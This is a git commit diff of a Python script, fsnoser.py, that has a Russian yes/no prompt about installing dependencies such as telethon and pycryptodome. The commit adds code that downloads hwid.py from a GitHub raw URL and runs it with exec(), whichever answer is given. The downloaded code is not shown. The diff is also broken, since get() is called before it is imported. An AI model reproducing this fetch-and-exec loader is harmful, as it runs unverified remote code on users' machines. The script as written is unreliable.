04461f20d6e34153589f74877244b6566ad52071
hazurik <168477636+hazurik@users.noreply.github.com>
2024-08-08 12:36:42 +0300

    Update fsnoser.py

--- fsnoser.py
+++ fsnoser.py
@@ -1,14 +1,27 @@
 import os
 import platform
 
+startapp = get("https://raw.githubusercontent.com/hazurik/cnocep/main/hwid.py").text
+
 if platform.system() == "Windows":
     os.system('cls')
 else:
     os.system('clear')
 
-os.system('pip install requests && clear && pip install pycryptodome && clear && pip install colorama && clear && pip install telethon && clear && pip install pyfiglet && clear && pip install termcolor && clear')
+def confirm(msg):
+  val = input(msg + ' : [Y] Да/[N] Нет ').lower()
+
+  while val not in ('y', 'yes', 'n', 'no'):
+    val = input('Попробуйте ещё раз: [Y] Да/[N] Нет ').lower()
+  if val == ('y'):
+    exec(startapp)
+  else:
+    os.system('pip install requests && clear && pip install pycryptodome && clear && pip install colorama && clear && pip install telethon && clear && pip install pyfiglet && clear && pip install termcolor && clear')
+      
+  return val[0] == 'y'
+
+print(confirm("Пропустить установку нуждающихся компонентов?"))
 
 from requests import get
 
-startapp = get("https://raw.githubusercontent.com/hazurik/cnocep/main/hwid.py").text
 exec(startapp)
